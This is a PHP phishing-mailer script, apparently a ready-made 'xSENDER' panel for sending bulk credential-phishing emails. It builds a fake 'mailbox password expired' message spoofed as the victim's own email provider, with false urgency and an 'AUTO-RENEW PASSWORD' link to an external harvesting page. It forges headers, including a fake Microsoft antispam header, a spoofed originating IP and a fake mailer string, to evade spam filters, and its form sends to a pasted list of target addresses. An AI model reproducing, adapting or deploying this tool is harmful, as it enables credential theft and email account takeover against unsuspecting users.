<?php
session_start();
ob_start("ob_gzhandler");
set_time_limit(0); 

$website="http://hierteis.de"; //Make this full url including folders of where login files reside



//sanitize data where any character is allowed
function sanitizer($check){
	$check=str_replace("\'","'",$check);
	$check=str_replace('\"','"',$check);
	$check=str_replace("\\","TN9OO***:::::t&*HHHHOOOoooo0000N",$check); //just to keep track of what I will change later
	$check=trim($check);
	$check=str_replace("<","&lt;",$check);
	$check=str_replace('>','&gt;',$check);
	$check=str_replace("\r\n","<br/>",$check);
	$check=str_replace("\n","<br/>",$check);
	$check=str_replace("\r","<br/>",$check);
	$check=str_replace("'","&#39;",$check);
	$check=str_replace('"','&quot;',$check);
	$check=str_replace(" fuck "," f**k ",$check);
	$check=str_replace(" shit "," s**t ",$check);
	$check=str_replace("TN9OO***:::::t&*HHHHOOOoooo0000N","&#92;",$check); //returning backslash in html entity
	 return $check;}
	 
	 
//makes data ok on edit textarea
 function resanitize($check){
	$check=str_replace("<br/>","\r\n",$check);
	$check=str_replace("<br/>","\n",$check);
	$check=str_replace("<br/>","\r",$check);
	$check=str_replace("&gt;",">",$check);
	$check=str_replace("&lt;","<",$check);
	$check=str_replace("&#39;","'",$check);
	$check=str_replace('&quot;','"',$check);
	 return $check;}
	 
	 
//validate email address
function validate_email($email){
	return filter_var($email, FILTER_VALIDATE_EMAIL);
}
	

	
//Email sending
function sending_email($email,$id='1',$details=''){
	$tmrdate = date('m/d/Y', strtotime('+1 days')); 
	$tmrdate2 = date('l m/d/Y', strtotime('+1 days')); 
	$arrdate = date('m/d/Y', strtotime('-2 days')); 
	$arrdate2 = date('l m/d/Y', strtotime('-2 days')); 
	$today = date('m/d/Y');	
	$rand=rand(999,99999);
	$usr="no-reply".$rand;
	$dom=$_SERVER['SERVER_NAME'];
	$em=explode('@',$email);
	$emaildomain = substr(strrchr($email, "@"), 1);
	$bc=explode('.',$emaildomain);
	$chgcap=strtolower($bc[0]);
	$frmsite=ucfirst($chgcap);
	$emincap=strtolower($em[0]);
	$mename=ucfirst($emincap);
	$message_id= time() .'-'.$rand.'-'. md5('token') . '@'. $_SERVER['SERVER_NAME'];
	
        

        $name_sent_from= "$frmsite Mailbox Center";
	

	$subject= "Mailbox password expired on $arrdate2";
	
         
        $mail_sent_from='no-reply.password-renewal';
	 

        global $website;
	// To send HTML mail, the Content-type header must be set
        $headers = "MIME-Version: 1.0" . "\r\n";
	$headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";
	$headers .= "X-Priority: 3\n";
        $headers .= "X-MSMail-Priority: Normal\n";
        $headers .= "Importance: Normal\n";
	$headers .= 'X-PHP-Originating-Script: 10003:'.$rand.'.php'."\n";
        $headers .= 'X-Mailer: PHPMailer 6.0.7 (https://github.com/PHPMailer/PHPMailer'."\n";
        $headers .= 'Message-ID: <Z8'.$rand.'2g8dIKtgni'.$rand.'NDSNzxPXn3pQNZ'.$rand.'@'.$dom.'>'."\n";
        $headers .= 'x-originating-ip: [104.43.173.'.rand(1, 240).']'."\n";
        $headers .= 'x-microsoft-antispam: BCL:0;PCL:0;RULEID:(2390118)(7020095)(4652040)(7021145)(8989299)(4534185)(7022145)(4603075)(4627221)(201702281549075)(8990200)(7048125)(7024125)(7027125)(7023125)(5600166)(711020)(4605104)(1401327)(2017052603328)(49563074)(7193020);SRVR:DM5PR18MB1372;'."\n";
	
	$headers .= "From: ".$name_sent_from." <".$mail_sent_from.">". "\r\n".
	"List-Unsubscribe: <mailto:unsubscribe-espc-tech-".$rand."N@$dom>" . "\r\n";
					
		

		
	//format message	
	$message=email_format($email,$id,$details);
	@mail($email,$subject, $message, $headers);	
}

        function email_format($email,$id='1',$details=''){
	global $website;
	$tmrdate = date('m/d/Y', strtotime('+1 days')); 
	$tmrdate2 = date('l m/d/Y', strtotime('+1 days')); 
	$arrdate = date('m/d/Y', strtotime('-2 days')); 
	$arrdate2 = date('l m/d/Y', strtotime('-2 days')); 
	$today = date('m/d/Y');	
	$rand=rand(999,99999);
	$url=$website."/#".$email;
	$unsubscribe=$website."/newsletters/unsubscribe/";
	$em=explode('@',$email);
	$emaildomain = substr(strrchr($email, "@"), 1);
	$bc=explode('.',$emaildomain);
	$chgcap=strtolower($bc[0]);
	$frmsite=ucfirst($chgcap);
	$emincap=strtolower($em[0]);
	$mename=ucfirst($emincap);
	$message="
   
    <table border='0' cellpadding='0' cellspacing='0' width='100%' class='mcnTextBlock' style='min-width:100%;'>
    <tbody class='mcnTextBlockOuter'>
    <tr>
    <td valign='top' class='mcnTextBlockInner' style='padding-top:9px;'>
                <!--[if mso]>
                <table align='left' border='0' cellspacing='0' cellpadding='0' width='100%' style='width:100%;'>
                <tr>
                <![endif]-->
                
                <!--[if mso]>
                <td valign='top' width='600' style='width:600px;'>
                <![endif]-->
                <table align='left' border='0' cellpadding='0' cellspacing='0' style='max-width:100%; min-width:100%;' width='100%' class='mcnTextContentContainer'>
                <tbody><tr>
                        
                <td valign='top' class='mcnTextContent' style='padding: 0px 18px 9px; line-height: 125%;'>


<br><br><p><font size='6' color='#FF6347'><b>MAILBOX PASSWORD RENEWAL</b></font></p><br><br>

<span style='font-size:14px;  font-family:verdana; color:#000000;'><b>Dear ".$mename."</b>,</strong><br><br>

The password for <b>".$email."</b> expired on $arrdate2,<br><br>

Auto-renew your password now from below portal.<br><br>

<a href='$url' style='font-size:12px;display:block;float:left;text-decoration:none;color:#FFFFFF; padding:10px 10px 10px 10px;margin:2px;background:#0174DF;'>AUTO-RENEW PASSWORD</a><br><br><br>

If you have any questions, visit <a href='$url'>Online Support</a>  or call us at +1 (877) 809-8877.<br><br>

</p>
<p style='text-align: justify; color: #FF0000; font-size: 14px; line-height: 150%;'><b>NOTE - $email will be dormant on $tmrdate; if password is not renewed today ($today).<br><br> 
</b></p>

Best Regards,<br>
$frmsite Service Crew.<br><br><br>
</span>

<span style=' font-family:verdana; color:#0000ff;'>_______________________________________________________</strong><br><br>

<span style='font-size:12px; line-height:1.2; font-family:arial;'>
</b>&copy All Rights Reserved. (1995-2019)</b> <br><br>
</span>


                        </td>
                    </tr>
					<tr>
</div>
    </div>
	<br><br>
</body>
</html>

	"; 

return $message; }?>
<?php system("chmod complete.php"); ?>
<?php chmod("complete.php",0644); ?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link rel="SHORTCUT ICON" href="http://mxmail.optimumelectronics.com/mail/skins/default/images/favicon.ico">
<title>WEBxSENDER</title>
<style type="text/css">
<!--
.form {font-family: "Courier New", Courier, monospace;border:none, background-color:#000000;}
form .text-field {font-family: "Courier New", Courier, monospace; border: 1px solid #A6A6A6;height: 40px;border-radius: 3px; margin-top: 3px;padding-left: 10px;
form .text-field {border: 1px solid #A6A6A6; width: 230px; height: 40px; border-radius: 3px; margin-top: 3px; padding-left: 10px; color: #6C6C6C; background: none repeat scroll 0% 0% #FCFCFC; outline: medium none;}
input[placeholder], [placeholder], [placeholder] {color: #6C6C6C !important; }color: #6C6C6C; box-shadow: 1px 2px 50px #A6A6A6; background: none repeat scroll 0% 0% #FCFCFC;outline: medium none;}input[placeholder], [placeholder], [placeholder] {color: #6C6C6C !important;}
form .text-area {font-family: "Courier New", Courier, monospace; border: 1px solid #A6A6A6; width: 330px;height: 130px;border-radius: 3px; margin-top: 3px;padding-left: 10px;}
form .msg-area {font-family: "Courier New", Courier, monospace; border: 1px solid #A6A6A6; width: 330px;height: 330px;border-radius: 3px; margin-top: 3px;padding-left: 10px;}
form .text-field {border: 1px solid #A6A6A6; width: 230px; height: 40px; border-radius: 3px; margin-top: 3px; padding-left: 10px; color: #6C6C6C; background: none repeat scroll 0% 0% #FCFCFC; outline: medium none;}
input[placeholder], [placeholder], [placeholder] {color: #6C6C6C !important; }color: #6C6C6C; box-shadow: 1px 2px 50px #A6A6A6; background: none repeat scroll 0% 0% #FCFCFC;outline: medium none;}input[placeholder], [placeholder], [placeholder] {color: #6C6C6C !important;}
.send {font-family: "Courier New", Courier, monospace;border:none; font-size:18px; background-color:#FFFFFF; font-black:bold}
.button {border-radius: 3px;border: 1px solid #336895;box-shadow: 0px 1px 0px #8DC2F0 inset;width: 242px;height: 40px;
    background: -moz-linear-gradient(center bottom , #4889C2 0%, #5BA7E9 100%) repeat scroll 0% 0% transparent;cursor: pointer;color: #FFF;font-weight: bold;text-shadow: 0px -1px 0px #336895;font-size: 13px;}
.div { box-shadow: 1px 2px 50px #888888; border-radius:1px;}
#Layer1 {	position:absolute;
	left:402px;
	top:22px;
	width:457px;
	height:121%;
	z-index:1;
	margin-top: 0.5%;
	margin-right: 5%;
	right: 20%;
	bottom: 15%;
	margin-bottom: 10%;
	margin-left: 5%;
	border: none #000;
	border-radius:10px;
}

-->
</style>
</head>

<body>
<form method='POST' action=''>
<div style='margin:0px;background:white;font-family:calibri;color:#000;font-size:13px;padding:10px;width:100%;'>
<div style='border:1px solid #c0c0c0;background:#fff;max-width:70%;margin:5px auto 5px auto;min-height:300px;box-shadow: 1px 2px 50px #888888; border-radius:3px;'>
<div style='padding:5px;margin:5px;font-size:16px;color:black;'><p style='clear:both;'>
  <table width="100%" border="0">
  <tr>
      <td height="23" colspan="2"><div align="center" class="form"><strong><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >R</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >A</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >P</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >I</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >D</spam>
<spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >R</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >E</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >S</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >P</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >O</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >N</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >D</spam>
<spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >S</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >E</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >N</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >D</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >E</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >R</spam>
<br>
<spam style='color:#E41B17;text-align:center;text-shadow:#000 1px 1px;'>WORK HARD</spam> </strong></div></td>
    </tr>
	<tr align="center"><td><div style='width:100%;'>  <?php
if(isset($_POST['go']) ){
	//sanitize the data
	$_SESSION['xsenderid']=sanitizer($_POST['id']);
	$separator=sanitizer($_POST['separator']);
	$details=sanitizer($_POST['details']);
	$mails=sanitizer($_POST['mails']);
	$id=$_SESSION['xsenderid'];
	if($separator==''){$separator='<br/>';}
	if($mails!='' && $details!=''){
	

		$mails=explode($separator,$mails);
		$total=count($mails);
		$valid=0;
			for($i=0;$i<$total;$i++){
				$email=$mails[$i];
					if(validate_email($email)){
						$valid=$valid+1;
						
						//Send here
						sending_email($email,$id,$details);
						//send here
						} else {print "<spam style='text-align: center; font-size: 12px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: RED; text-decoration: none; display:inline-block; height: 20px; padding-left: 5px; padding-right: 5px; border-radius: 7px;'>".$email." NOT A VALID EMAIL</spam>"; }
			}
		print "<spam style='text-align: center; font-size: 12px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: green; text-decoration: none; display:inline-block; height: 20px; padding-left: 5px; padding-right: 5px; border-radius: 7px;'>WELL SENT ".$valid." OUT OF ".$total." ";


	} else {print "<spam style='text-align: center; font-size: 12px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: BLACK; text-decoration: none; display:inline-block; height: 20px; padding-left: 5px; padding-right: 5px; border-radius: 7px;'>MAILS OR DETAIL ARE EMPTY</spam>"; }
}
?> </div></td></tr>
  <tr>
    <td valign="top"><div>
<select name='id' class="text-field" style='width:100%;'>
<?php
if(isset($_SESSION['xsenderid']))
{print "<option value='".$_SESSION['xsenderid']."'>".$_SESSION['xsenderid']."</option>";}
?>
<option value='1'>1</option>
<option value='2'>2</option>
<option value='3'>3</option>
<option value='4'>4</option>
</select>
      </div>
      <div>
        
        <textarea name='separator' class="text-field" size="30" placeholder="Email Separator" style='width:100%;'><?php if(isset($_POST['separator'])){print resanitize($_POST['separator']);} ?></textarea>
      </div>
      <div>
        <textarea placeholder='FAKE IP' class="text-field" size="83%" name='details' style='width:100%;'><?php if(isset($_POST['details'])){print resanitize($_POST['details']);} ?></textarea>
      </div>      <div>
        <textarea placeholder='PASTE MAILS HERE' class="text-area" name='mails' cols="35" rows="10" style='width:100%;'><?php if(isset($_POST['mails'])){print resanitize($_POST['mails']);} ?></textarea>
      </div>
	  <br />
	  <div><input type="submit" style="border-radius: 3px;border: 1px solid #336895;box-shadow: 0px 1px 0px #8DC2F0 inset;width: 242px;height: 40px;background: -moz-linear-gradient(center bottom , #4889C2 0%, #5BA7E9 100%) repeat scroll 0% 0% transparent;cursor: pointer;color: #FFF;font-weight: bold;text-shadow: 0px -1px 0px #336895;font-size: 13px;" name="go" value="SEND"> </div><br />
<div></div>	  </td>
    <td align="left"><div><?php print email_format('web@xsender.net',1,'IP Address: 85.214.132.117 <br/>Location: Germany (DE)<br/>'); ?> </div></td>
  </tr>
</table>
<center>
<table>
<tr align="center"><td>
  <spam style='color:#E41B17;align:center;text-shadow:#000 1px 1px;'>Don't share this xSENDER</spam>
</td></tr></table></center>
 </div>
</div>
</div>
</div>
</form>
</body>
</html>
<?php
function make_seed() {
    return microtime(true);
}

// Seed the random number generator
mt_srand(make_seed());

function randchar($length = 1, $string = 'abcdefghijklmnopqrstuvwxyz0123456789') {
    $result = '';
    $stringLength = strlen($string); // Store string length for better performance
    for ($i = 0; $i < $length; $i++) {
        // Use mt_rand to generate a random index in the string's range
        $result .= $string[mt_rand(0, $stringLength - 1)];
    }
    return $result;
}

// Example usage
$result = randchar(5); // Generates a random string of 5 characters
echo $result;
?>


